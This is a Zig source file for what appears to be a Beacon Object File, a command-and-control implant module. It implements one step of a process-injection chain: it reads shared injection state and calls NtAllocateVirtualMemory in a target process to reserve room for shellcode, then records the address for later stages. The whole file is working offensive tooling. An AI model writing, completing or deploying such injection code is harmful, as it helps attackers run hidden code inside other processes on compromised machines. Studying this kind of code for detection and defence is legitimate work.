const std = @import("std");
const beacon = @import("bof_api").beacon;
const w32 = @import("bof_api").win32;
const shared = @import("wInjectionChainShared.zig");

pub export fn go(adata: ?[*]u8, alen: i32) callconv(.c) u8 {
    @import("bof_api").init(adata, alen, .{});

    var parser = beacon.datap{};
    beacon.dataParse(&parser, adata, alen);

    var state: *shared.State = blk: {
        const mem = beacon.dataExtract(&parser, null).?[0..@sizeOf(usize)];
        break :blk @ptrFromInt(std.mem.readInt(usize, mem, .little));
    };

    var size: w32.SIZE_T = state.shellcode_len;
    var base_address: usize = 0;
    const base_address_ptr: *usize = &base_address;

    //std.debug.print("{d}\n", .{base_address_ptr.*});

    state.nt_status = w32.NtAllocateVirtualMemory(
        state.process_handle,
        @ptrCast(base_address_ptr),
        0,
        &size,
        w32.MEM_COMMIT | w32.MEM_RESERVE,
        w32.PAGE_READWRITE,
    );

    //std.debug.print("0x{x}\n", .{base_address_ptr.*});

    state.base_address = base_address_ptr.*;

    return 0;
}
